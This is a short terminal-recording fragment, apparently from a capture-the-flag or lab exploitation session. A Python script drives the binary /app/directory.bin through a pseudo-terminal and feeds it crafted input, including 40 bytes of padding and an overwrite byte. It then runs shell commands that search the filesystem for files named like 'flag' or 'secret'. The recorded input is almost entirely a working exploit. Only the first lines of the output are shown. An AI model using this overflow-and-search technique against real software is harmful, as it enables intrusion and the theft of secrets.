[3111.07007, "i", "cat << 'EOF' > /tmp/pty_simple.py\nimport pty, os, time\npid, fd = pty.fork()\nif pid == 0:\n    os.execv('/app/directory.bin', ['/app/directory.bin'])\nelse:\n    time.sleep(0.5)\n    for i in range(9):\n        os.write(fd, b\"1\\n\")\n        time.sleep(0.05)\n        os.write(fd, b\"A\\n\")\n        time.sleep(0.05)\n    os.write(fd, b\"1\\n\")\n    time.sleep(0.05)\n    os.write(fd, b\"A\"*40 + b\"\\x37\")\n    time.sleep(0.05)\n    os.write(fd, b\"4\\n\")\n    time.sleep(0.5)\n    os.write(fd, b\"echo EXPLOIT_SUCCESS; find / -iname '*flag*' -o -iname '*secret*' 2>/dev/null; ls -la /tmp; exit\\n\")\n    time.sleep(1)\n    out = b''\n    while True:\n        try:\n            chunk = os.read(fd, 4096)\n            if not chunk: break\n            out += chunk\n        except: break\n    open('/tmp/exploit_out', 'wb').write(out)\nEOF\npython3 /tmp/pty_simple.py\n"]
[3111.070278, "o", "cat << 'EOF' > /tmp/pty_simple.py\r\nimport pty, os, time\r\npid, fd = pty.fork()\r\nif pid == 0:\r\n    os.execv('/app/directory.bin', ['/app/directory.bin'])\r\nelse:\r\n"]
